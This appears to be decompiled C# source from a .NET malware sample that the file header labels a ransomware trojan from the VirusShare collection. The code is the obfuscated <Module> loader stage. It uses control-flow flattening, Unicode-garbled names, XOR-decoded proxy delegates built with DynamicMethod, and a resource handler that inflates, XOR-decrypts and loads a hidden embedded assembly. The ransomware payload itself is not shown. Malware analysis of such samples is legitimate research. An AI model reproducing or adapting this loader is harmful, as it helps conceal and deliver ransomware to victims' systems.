// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: mtrl, Version=5.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D340C4D9-77FF-49DB-A007-50B4002F5AFA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-429a36b53420915e57e9034d24b9ce0668b08c5e0e1d3eca43c67980b9dd2198.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Reflection.Emit;
using System.Text;

internal class \u003CModule\u003E
{
  static Dictionary<uint, object> ꞕ\uF303柳䠼뗊谡彐Ʋ;
  static Stream \u23FC㬓儴ᴟ嚟矶殷ﮊ;
  static Assembly 蹎銽蝙䐗\u0BDA\u1FBF\u23BB磎;

  static \u003CModule\u003E()
  {
    AppDomain.CurrentDomain.ResourceResolve += new ResolveEventHandler(\u003CModule\u003E.\uFFFDXD\u005D\uFFFD\uFFFD\uFFFDH\uFFFD\uFFFDT\uFFFDݓ\u0027\uFFFD);
    int num = -(~-6 - (2 + 8));
    while (true)
    {
      int count;
      Assembly executingAssembly;
      DeflateStream deflateStream;
      byte[] buffer;
      switch (num)
      {
        case 1:
          deflateStream = new DeflateStream(executingAssembly.GetManifestResourceStream(Encoding.UTF8.GetString(BitConverter.GetBytes(464293469))), CompressionMode.Decompress);
          num = ~(1 - (9 - 6)) + 5;
          continue;
        case 2:
          goto label_13;
        case 3:
          count = deflateStream.Read(buffer, 0, 4096);
          break;
        case 4:
          executingAssembly = Assembly.GetExecutingAssembly();
          num = 8 + 8 - (6 - 7) - 17 + (7 - 6);
          continue;
        case 5:
          \u003CModule\u003E.ꞕ\uF303柳䠼뗊谡彐Ʋ = new Dictionary<uint, object>();
          num = -6 - (-8 - (7 - 3)) - ~4 - 2;
          continue;
        case 6:
          buffer = new byte[4096];
          num = 7 - ~~4;
          continue;
        case 7:
          텕භṟ៝笴\uE676\u1C9F\uE2C7.ዳ뷅\uE09C䘦\uF128迡ﰍꮞ();
          num = 8 - -7 - 13;
          continue;
        case 8:
          deflateStream.Dispose();
          컇\uEBC0\u2267섹惼尶\uFFFD鋎.\uECF2缀糧퀄娅蚖脆垎();
          num = 7 - ~~0;
          continue;
        case 9:
          \u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ = (Stream) new MemoryStream();
          num = ~~(17 - (6 - 5 + (9 + 3)));
          continue;
        default:
          if (count == 0)
          {
            num = -2 - (5 - 8 + -7);
            continue;
          }
          break;
      }
      \u003CModule\u003E.\u23FC㬓儴ᴟ嚟矶殷ﮊ.Write(buffer, 0, count);
      count = deflateStream.Read(buffer, 0, 4096);
      num = 2 - (~7 - -10);
    }
label_13:;
  }

  internal static void မ\u2790鴮䓧橈攣篏ⷸ(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    char[] chArray = new char[fieldFromHandle.Name.Length];
    int num1 = ~(~5 - --12);
    while (true)
    {
      DynamicMethod dynamicMethod;
      int index1;
      int num2;
      int length;
      do
      {
        ILGenerator ilGenerator;
        int num3;
        ConstructorInfo con;
        Type[] parameterTypes;
        int index2;
        ParameterInfo[] parameters;
        int num4;
        do
        {
          switch (num1)
          {
            case 1:
              ilGenerator = dynamicMethod.GetILGenerator();
              num1 = ~~(27 - (7 - ~8));
              continue;
            case 2:
              dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, con.DeclaringType, true);
              num1 = -(5 - 2 - 4);
              continue;
            case 3:
              num1 = --5 - 4;
              continue;
            case 4:
              index2 = 0;
              num1 = --18 - (5 + 5) + 6;
              continue;
            case 5:
              dynamicMethod = new DynamicMethod("", con.DeclaringType, parameterTypes, fieldFromHandle.DeclaringType, true);
              num1 = --5 + 4 - 6;
              continue;
            case 6:
              ilGenerator.Emit(OpCodes.Newobj, con);
              ilGenerator.Emit(OpCodes.Ret);
              num1 = 3 - ~(17 - (~5 + (7 + 4)));
              continue;
            case 7:
              parameters = con.GetParameters();
              parameterTypes = new Type[parameters.Length];
              num1 = -(--2 + ~5);
              continue;
            case 8:
            case 14:
              if (index2 >= parameters.Length)
              {
                if (!con.DeclaringType.IsInterface)
                {
                  num4 = con.DeclaringType.IsArray ? 1 : 0;
                  num1 = -(-3 - (6 - 7));
                  continue;
                }
                goto case 5;
              }
              else
                goto label_20;
            case 9:
              goto label_14;
            case 10:
              goto label_15;
            case 11:
              goto label_16;
            case 12:
              goto label_19;
            case 13:
              goto label_17;
            case 15:
              goto label_21;
            case 16:
              goto label_23;
            case 17:
              goto label_24;
            default:
              ilGenerator.Emit(OpCodes.Ldarg_S, num3);
              ++num3;
              num1 = ~~(14 + ~(3 - 5));
              continue;
          }
        }
        while (num4 == 0);
        goto label_13;
label_19:
        return;
label_13:
        num1 = -4 - (4 + 2) - -15;
        continue;
label_14:
        num1 = 2 + 3 - -18 - 8;
        continue;
label_15:
        byte[] numArray = Convert.FromBase64String(new string(chArray));
        con = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 0) ^ 324446635 | (int) numArray[4] << 24) as ConstructorInfo;
        num1 = ~3 - (-7 - (7 + 7 - 6)) - 4;
        continue;
label_16:
        num3 = 0;
        num1 = -(-12 - (8 - 6 + -2) - ~2);
        continue;
label_17:
        if (index1 >= chArray.Length)
        {
          num1 = --~-11;
          continue;
        }
        goto label_25;
label_20:
        parameterTypes[index2] = parameters[index2].ParameterType;
        ++index2;
        num1 = -~--7;
        continue;
label_21:
        num2 = num3;
        length = parameterTypes.Length;
        num1 = ~-27 - (9 + 9) - 8;
        continue;
label_24:
        index1 = 0;
        goto label_17;
      }
      while (num2 < length);
      num1 = 7 - -(6 - ~~7);
      continue;
label_23:
      fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
      num1 = 10 + ~(4 - 7);
      continue;
label_25:
      chArray[index1] = (char) ((uint) (byte) fieldFromHandle.Name[index1] ^ (uint) index1);
      ++index1;
      num1 = ~(4 + 4 - --22);
    }
  }

  internal static void 봄棣\uE433仲䔞韲ꡅ\uFFFD(RuntimeFieldHandle f)
  {
    FieldInfo fieldFromHandle = FieldInfo.GetFieldFromHandle(f);
    int num1 = 1 - ~~6 + (9 - 2);
    MethodInfo methodInfo;
    ILGenerator ilGenerator;
    byte[] numArray;
    DynamicMethod dynamicMethod;
    while (true)
    {
      ParameterInfo[] parameters;
      Type[] parameterTypes;
      char[] chArray;
      int num2;
      int index1;
      int index2;
      switch (num1)
      {
        case 1:
          parameters = methodInfo.GetParameters();
          parameterTypes = new Type[parameters.Length + 1];
          num1 = 3 - ~13 - 6;
          continue;
        case 2:
          chArray = new char[fieldFromHandle.Name.Length];
          num1 = -13 - (-2 - (9 + 4)) + (8 - 3);
          continue;
        case 3:
          ilGenerator.Emit(OpCodes.Castclass, methodInfo.DeclaringType);
          break;
        case 4:
        case 5:
          if (index1 >= chArray.Length)
          {
            numArray = Convert.FromBase64String(new string(chArray));
            methodInfo = fieldFromHandle.Module.ResolveMethod(BitConverter.ToInt32(numArray, 1) ^ 1933286637 | ((int) numArray[0] & (int) sbyte.MaxValue) << 24) as MethodInfo;
            if (!methodInfo.IsStatic)
              goto case 1;
            else
              goto label_10;
          }
          else
          {
            chArray[index1] = (char) ((uint) (byte) fieldFromHandle.Name[index1] ^ (uint) index1);
            num1 = 4 - -14 - 6;
            continue;
          }
        case 6:
          goto label_12;
        case 7:
          index1 = 0;
          num1 = ~(--2 + -8);
          continue;
        case 8:
          if (num2 == 0)
          {
            num1 = --(-7 + (6 - 6) - -10);
            continue;
          }
          break;
        case 9:
          for (; index2 < parameters.Length; ++index2)
            parameterTypes[index2 + 1] = parameters[index2].ParameterType;
          num1 = -5 - ~4;
          continue;
        case 10:
label_19:
          if (num2 >= parameterTypes.Length)
          {
            num1 = ~(~2 - ~-5);
            continue;
          }
          ilGenerator.Emit(OpCodes.Ldarg, num2);
          num1 = -(-(6 + ~2) + ~4);
          continue;
        case 11:
          parameterTypes[0] = typeof (object);
          index2 = 0;
          num1 = -(-16 - -7);
          continue;
        case 12:
          ++index1;
          num1 = -3 + (4 + 8) - 5;
          continue;
        case 13:
          if (!methodInfo.DeclaringType.IsArray)
          {
            dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, methodInfo.DeclaringType, true);
            goto label_26;
          }
          else
            goto label_24;
        default:
          if (!methodInfo.DeclaringType.IsInterface)
          {
            num1 = -~(21 + (5 - 9 + (4 - 9)));
            continue;
          }
          goto label_24;
      }
      ++num2;
      num1 = ~~--10;
      continue;
label_24:
      dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, fieldFromHandle.DeclaringType, true);
label_26:
      ilGenerator = dynamicMethod.GetILGenerator();
      num2 = 0;
      goto label_19;
    }
label_10:
    fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldFromHandle.FieldType, methodInfo));
    return;
label_12:
    ilGenerator.Emit(((int) numArray[0] & 128) != 0 ? OpCodes.Callvirt : OpCodes.Call, methodInfo);
    ilGenerator.Emit(OpCodes.Ret);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldFromHandle.FieldType));
  }

  internal static Assembly \uFFFDXD\u005D\uFFFD\uFFFD\uFFFDH\uFFFD\uFFFDT\uFFFDݓ\u0027\uFFFD(
    object sender,
    ResolveEventArgs args)
  {
    if ((object) \u003CModule\u003E.蹎銽蝙䐗\u0BDA\u1FBF\u23BB磎 == null)
    {
      int num1 = 5 - -(~~7 - 12);
      Stream manifestResourceStream;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_4;
          default:
            manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream("�\u0012\u0018]�r�C�S�[\"lf�");
            num1 = ~(4 + 6 - ~-13);
            continue;
        }
      }
label_4:
      using (BinaryReader binaryReader = new BinaryReader((Stream) new DeflateStream(manifestResourceStream, CompressionMode.Decompress)))
      {
        byte[] numArray = binaryReader.ReadBytes(binaryReader.ReadInt32());
        byte num2 = 100;
        int num3 = -3 - -(6 - 3);
        while (true)
        {
          int num4;
          int length;
          do
          {
            int index;
            switch (num3)
            {
              case 1:
                num2 = (byte) ((int) num2 * 100 % 256);
                num3 = ~(-13 - -(4 + 5) + -3);
                continue;
              case 2:
                Buffer.BlockCopy((Array) new byte[numArray.Length], 0, (Array) numArray, 0, numArray.Length);
                num3 = ----5;
                continue;
              case 3:
                \u003CModule\u003E.蹎銽蝙䐗\u0BDA\u1FBF\u23BB磎 = Assembly.Load(numArray);
                num3 = ~(-2 + -4 - -13 + ~9);
                continue;
              case 4:
                numArray[index] = (byte) ((uint) numArray[index] ^ (uint) num2);
                num3 = 3 - -~1;
                continue;
              case 5:
                goto label_18;
              case 6:
                ++index;
                break;
              default:
                index = 0;
                break;
            }
            num4 = index;
            length = numArray.Length;
            num3 = -(3 - 4 + (5 - 8));
          }
          while (num4 < length);
          num3 = -(1 + ~(3 - 5) + ~4);
        }
      }
    }
label_18:
    return Array.IndexOf<string>(\u003CModule\u003E.蹎銽蝙䐗\u0BDA\u1FBF\u23BB磎.GetManifestResourceNames(), args.Name) == -1 ? (Assembly) null : \u003CModule\u003E.蹎銽蝙䐗\u0BDA\u1FBF\u23BB磎;
  }
}
